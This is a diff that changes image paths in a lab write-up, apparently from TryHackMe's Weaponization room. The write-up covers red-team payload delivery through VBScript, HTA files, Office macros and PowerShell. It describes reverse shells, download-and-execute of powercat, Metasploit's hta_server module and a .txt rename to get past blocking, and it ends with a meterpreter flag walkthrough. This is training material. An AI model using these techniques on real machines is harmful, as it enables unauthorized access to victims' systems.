@@ -9,7 +9,7 @@ part: 6
 
 **Introduction**
 
-![](../../assets/storage/images/writeups/weaponization/img001_image44.png)
+![](../assets/storage/images/writeups/weaponization/img001_image44.png)
 
 ** **In the Cyber Kill Chain model, **Weaponization** is the second stage. In this stage, the attacker **generates and develops their own malicious code** using **deliverable payloads** such as **word documents, PDFs etc.**The weaponization stage aims to use the malicious weapon to exploit the target machine and gain initial access.
 
@@ -18,7 +18,7 @@ An organisation’s environmental policy often blocks downloading and executing 
 
 The following graph is an example of weaponization, where a crafted custom PDF or Microsoft Office document is used to deliver a malicious payload. The custom payload is configured to connect back to the C2 environment of the red team infrastructure.
 
-![](../../assets/storage/images/writeups/weaponization/img002_image45.png)
+![](../assets/storage/images/writeups/weaponization/img002_image45.png)
 For more information about red team toolkits, please visit the following: a GitHub repository that has it all, including initial access, payload development, delivery methods, and others.
 
 Most organizations block or monitor the execution of .exe files within their controlled environment. For that reason, red teamers rely on executing payloads using other techniques, such as built-in windows scripting technologies. Therefore, this task focuses on various popular and effective scripting techniques, including:
@@ -41,7 +41,7 @@ Now, let’s write a simple VBScript code to create a message box that shows the
 Dim message
 message = "Welcome to THM"
 MsgBox message
-![](../../assets/storage/images/writeups/weaponization/img003_image46.png)
+![](../assets/storage/images/writeups/weaponization/img003_image46.png)
 
 So, in the first line, we declared the **message** variable using **Dim**. Then we store a string value of **Welcome to THM **in the **message** variable. In the next line, we use the MsgBox function to show the content of the variable. For more information about the MsgBox function, please visit here: https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/scripting-articles/sfw6660x(v=vs.84)?redirectedfrom=MSDN
 
@@ -56,11 +56,11 @@ We create an object of the **WScript **library using **CreateObject** to call th
 
 To execute the **vbs** file, we can run it using the **wscript** as follows:**wscript <filename.vbs>**
 
-![](../../assets/storage/images/writeups/weaponization/img004_image47.png)
+![](../assets/storage/images/writeups/weaponization/img004_image47.png)
 Here is another trick:If VBS files are blacklisted, then we can rename the file to **.txt **and run it using **wscript** as follows:
 wscript /e:VBScript c:\Users\thm\Desktop\payload.txt
 
-![](../../assets/storage/images/writeups/weaponization/img005_image48.png)
+![](../assets/storage/images/writeups/weaponization/img005_image48.png)
 
 **An HTML Application (HTA)**
 HTA stands for “HTML Application”. It allows you to create a downloadable file that takes all the information regarding how it is displayed and rendered.
@@ -69,16 +69,16 @@ HTML Application (HTA) files are files that contain HTML, JScript, and or VBScri
 The LOLBINS (Living-Off-The-Land Binaries) tool **mshta** is used to execute **HTA **files. It can be executed by itself or automatically from Internet Explorer.
 
 In the following example, we will use an **ActiveXObject** in our payload as proof of concept to execute **cmd.exe**. Consider the following HTML code:
-![](../../assets/storage/images/writeups/weaponization/img006_image49.png)
+![](../assets/storage/images/writeups/weaponization/img006_image49.png)
 
 Then serve the **payload.hta** from a web server.
-![](../../assets/storage/images/writeups/weaponization/img007_image50.png)
+![](../assets/storage/images/writeups/weaponization/img007_image50.png)
 This can be done from the attacker machine as follows:
 
 On the victim machine, visit the malicious link using Edge, at /payload.hta
 (<attackbox ip>:8090/payload.hta)
 
-![](../../assets/storage/images/writeups/weaponization/img008_image51.png)
+![](../assets/storage/images/writeups/weaponization/img008_image51.png)
 So once we run the file and the payload gets executed, it will invoke **cmd.exe**
 The figure above shows that we have successfully executed the **cmd.exe**
 
@@ -92,12 +92,12 @@ On the attacking machine, we need to listen to the port **443** using **nc.** Th
 
 Once the victim visits the malicious URL (**in my example: 192.168.0.115:443/htm.hta)**,and hits run, we get the connection back:
 
-![](../../assets/storage/images/writeups/weaponization/img009_image52.png)
+![](../assets/storage/images/writeups/weaponization/img009_image52.png)
 
 **Malicious HTA via Metasploit**
 There is another way to generate and serve malicious HTA files using the Metasploit framework.
 First, run the Metasploit framework using **msfconsole -q **command. Under the exploit section, there is **exploit/windows/misc/hta_server**, which requires selecting and setting information such as **LHOST**, **LPORT**, **SRVHOST**, **Payload**, and finally executing **exploit** to run the module.
-![](../../assets/storage/images/writeups/weaponization/img010_image53.png)
+![](../assets/storage/images/writeups/weaponization/img010_image53.png)
 
 **Visual Basic for Application (VBA)**
 VBA stands for Visual Basic for Applications, a programming language by Microsoft implemented for Microsoft applications such as Microsoft Word, Excel, Powerpoint, etc.
@@ -117,7 +117,7 @@ We create a blank microsoft document to make our first **macro**.
 We first need to open the Visual Basic Editor by selecting **view** -> **macros**.
 The Macros window shows how to create our own macro within the document.
 
-![](../../assets/storage/images/writeups/weaponization/img011_image54.png)
+![](../assets/storage/images/writeups/weaponization/img011_image54.png)
 
 Sub THM()
 MsgBox ("Welcome to Weaponization Room!")
@@ -141,7 +141,7 @@ It is important to note that for this macro to work, we will need to save it in 
 Now let’s save the file as **Word 97-2003 Template** where the macro is enabled.
 
 After reopening our word document, Word will warn us that macros are disabled. We need to enable them. After doing so, it gets automatically executed.
-![](../../assets/storage/images/writeups/weaponization/img012_image55.png)
+![](../assets/storage/images/writeups/weaponization/img012_image55.png)
 
 Now, we can edit the word document and create a macro function that executes something like calc.exe or any executable file as proof of concept, as follows:Sub PoC()
 Dim payload As String
@@ -169,7 +169,7 @@ Write-Output "Welcome to the Weaponization Room!"
 Save this file as **thm.ps1**
 
 With the **Write-Output**, we print the message **“Welcome to the Weaponization Room!” **to the command prompt. Now let’s run it and see the result.
-![](../../assets/storage/images/writeups/weaponization/img013_image56.png)
+![](../assets/storage/images/writeups/weaponization/img013_image56.png)
 
 **Execution Policy**
 
@@ -205,7 +205,7 @@ Now, from the victim machine, we download the payload and execute it using Power
 
 Now that we have executed the command above, the victim machine downloads the **powercat.ps1** payload from our web server then executes it locally on the target using **cmd.exe** and sends a connection back to the AttackBox that is listening on port **1337**.
 After a couple of seconds, we should receive a connection callback.
-![](../../assets/storage/images/writeups/weaponization/img014_image57.png)
+![](../assets/storage/images/writeups/weaponization/img014_image57.png)
 
 **Command and Control (C2)**
 We already did this one before
@@ -238,7 +238,7 @@ Often, organizations establish strong policies such as disabling USB usage withi
 Common USB attacks used to weaponize USB devices include **Rubber Ducky** and **USBHarpoon**, charging USB cable, such as **O.MG** **Cable.**
 
 Practice Arena (Writeup)
-![](../../assets/storage/images/writeups/weaponization/img015_image58.png)
+![](../assets/storage/images/writeups/weaponization/img015_image58.png)
 Back from the section which explained how to create a malicious HTA with Metasploit, i went into the msf console and ran “use exploit/windows/misc_hta_server”
 I then set the LHOST, LPORt and SRVHOST accordingly. Then i ran “set payload windows/meterpreter/reverse_tcp” and then “exploit”.
 
@@ -251,16 +251,16 @@ Interacting with it by “sessions -i 1” will allow us to access a meterpreter
 The commands went like this:**ls**
 **cd ..**
 **ls**
-![](../../assets/storage/images/writeups/weaponization/img016_image59.png)
+![](../assets/storage/images/writeups/weaponization/img016_image59.png)
 Then:
 **cd Users**
 **ls**
-![](../../assets/storage/images/writeups/weaponization/img017_image60.png)
+![](../assets/storage/images/writeups/weaponization/img017_image60.png)
 
 **then , cd thm**
 **Then cd Desktop**
-![](../../assets/storage/images/writeups/weaponization/img018_image61.png)
+![](../assets/storage/images/writeups/weaponization/img018_image61.png)
 
 **And the flag:**
-![](../../assets/storage/images/writeups/weaponization/img019_image62.png)
+![](../assets/storage/images/writeups/weaponization/img019_image62.png)
 **Also:**   A very useful MSFVenom cheat sheet https://web.archive.org/web/20220607215637/https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/
